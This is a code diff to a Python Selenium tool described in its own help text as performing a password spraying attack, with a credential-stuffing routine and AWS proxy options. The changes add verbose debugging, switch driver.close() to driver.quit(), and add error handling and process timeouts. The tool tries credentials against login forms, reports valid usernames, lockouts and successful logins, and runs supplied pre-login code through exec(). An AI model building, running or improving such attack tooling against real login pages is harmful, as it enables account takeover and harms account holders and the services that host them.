@@ -30,6 +30,11 @@ class Colors:
     UNDERLINE = '\033[4m'
 
 
+def verbose_print(message, spray_config):
+    if getattr(spray_config, 'verbose', False):
+        print(message)
+
+
 def parse_arguments():
     parser = argparse.ArgumentParser(description="Performs a password spraying attack utilizing Selenium.")
     required = parser.add_argument_group("Required")
@@ -108,6 +113,8 @@ def parse_arguments():
     aws_group.add_argument("--aws-secret-key", help="AWS Secret Access Key")
     aws_group.add_argument("--aws-session-token", help="AWS Session Token (optional)")
     aws_group.add_argument("--aws-region", default="us-east-2", help="AWS Region")
+
+    optional.add_argument('-v', '--verbose', action='store_true', help="Enable verbose debug output")
 
     return parser.parse_args()
 
@@ -385,28 +392,31 @@ def attempt_login(spray_config, proxy_url):
     driver.delete_all_cookies()
     for i in range(3):
         try:
+            verbose_print(f"[DEBUG] Loading URL attempt {i+1} - {spray_config.url}", spray_config)
             driver.get(spray_config.url)
             break
         except WebDriverException:
             if i == 2:
                 print(
                     f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - ERROR - Could not load the URL: {spray_config.url}")
-                driver.close()
+                driver.quit()
                 return {'USERNAME': spray_config.username, 'PASSWORD': spray_config.password, 'RESULT': "ERROR"}
 
     # Execute Before Code
     if spray_config.pre_login_code:
+        verbose_print("[DEBUG] Executing pre-login code", spray_config)
         exec(spray_config.pre_login_code)
 
     # Wait until the username box loads
     try:
         WebDriverWait(driver, 5).until(
             ec.element_to_be_clickable((By.XPATH, f"//input[@{spray_config.username_field_key}='{spray_config.username_field_value}']")))
-    except:
+    except Exception as e:
+        verbose_print(f"[DEBUG] Username field not found: {e}", spray_config)
         print(f"ERROR - Could not find the username field with key {spray_config.username_field_key} and value "
               f"{spray_config.username_field_value}")
-        driver.close()
-        return
+        driver.quit()
+        return {'USERNAME': spray_config.username, 'PASSWORD': spray_config.password, 'RESULT': "ERROR"}
 
     # Find the username box
     input_box = driver.find_element(By.XPATH, f"//input[@{spray_config.username_field_key}='{spray_config.username_field_value}']")
@@ -430,28 +440,29 @@ def attempt_login(spray_config, proxy_url):
 
     if list_in_string(string_to_check=driver.page_source.lower(), list_to_compare=spray_config.invalid_username):
         print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - USERNAME INVALID: {spray_config.username}")
-        driver.close()
+        driver.quit()
         return {'USERNAME': spray_config.username, 'PASSWORD': spray_config.password, 'RESULT': "INVALID USERNAME"}
     elif list_in_string(string_to_check=driver.page_source.lower(), list_to_compare=spray_config.lockout):
-        driver.close()
+        driver.quit()
         print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - {Colors.WARNING}ACCOUNT LOCKOUT{Colors.END}: {spray_config.username}")
         return {'USERNAME': spray_config.username, 'PASSWORD': spray_config.password, 'RESULT': "LOCKED"}
     elif list_in_string(string_to_check=driver.page_source.lower(), list_to_compare=spray_config.passwordless):
-        driver.close()
+        driver.quit()
         print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - PASSWORDLESS: {spray_config.username}")
         return {'USERNAME': spray_config.username, 'PASSWORD': spray_config.password, 'RESULT': "PASSWORDLESS"}
     elif not spray_config.password:
-        driver.close()
+        driver.quit()
         print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - {Colors.GREEN}VALID USERNAME{Colors.END}: {spray_config.username}")
         return {'USERNAME': spray_config.username, 'PASSWORD': spray_config.password, 'RESULT': "VALID USERNAME"}
 
     try:
         WebDriverWait(driver, 3).until(
             ec.element_to_be_clickable((By.XPATH, f"//input[@{spray_config.password_field_key}='{spray_config.password_field_value}']")))
-    except:
+    except Exception as e:
+        verbose_print(f"[DEBUG] Password field not found: {e}", spray_config)
         print(f"ERROR - Could not find the password field with key '{spray_config.password_field_key}' and value "
               f"'{spray_config.password_field_value}'")
-        driver.close()
+        driver.quit()
         return {'USERNAME': spray_config.username, 'PASSWORD': spray_config.password, 'RESULT': "ERROR"}
 
     password_box = driver.find_element(By.XPATH, f"//input[@{spray_config.password_field_key}='{spray_config.password_field_value}']")
@@ -462,7 +473,8 @@ def attempt_login(spray_config, proxy_url):
         try:
             checkbox = driver.find_element(By.XPATH, f"//input[@{spray_config.checkbox_key}='{spray_config.checkbox_value}']")
             checkbox.click()
-        except:
+        except Exception as e:
+            verbose_print(f"[DEBUG] Checkbox not found: {e}", spray_config)
             print(f"ERROR - Could not find the password field with key {spray_config.password_field_key} and value "
                   f"{spray_config.password_field_value}")
 
@@ -484,7 +496,10 @@ def attempt_login(spray_config, proxy_url):
     elif not result and spray_config.success:
         result = "INVALID"
 
-    driver.quit()
+    try:
+        driver.quit()
+    except Exception as e:
+        verbose_print(f"[DEBUG] Error closing browser: {e}", spray_config)
 
     if result == "SUCCESS":
         print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - {Colors.GREEN}SUCCESS{Colors.END}: {spray_config.username} - "
@@ -536,7 +551,10 @@ def credential_stuffing(spray_config, args, proxies):
             processes.append(p)
 
         for p in processes:
-            p.join()
+            p.join(timeout=60)
+            if p.is_alive():
+                print(f"Process {p.pid} timed out. Terminating.")
+                p.terminate()
 
         while not queue.empty():
             results.extend(queue.get())
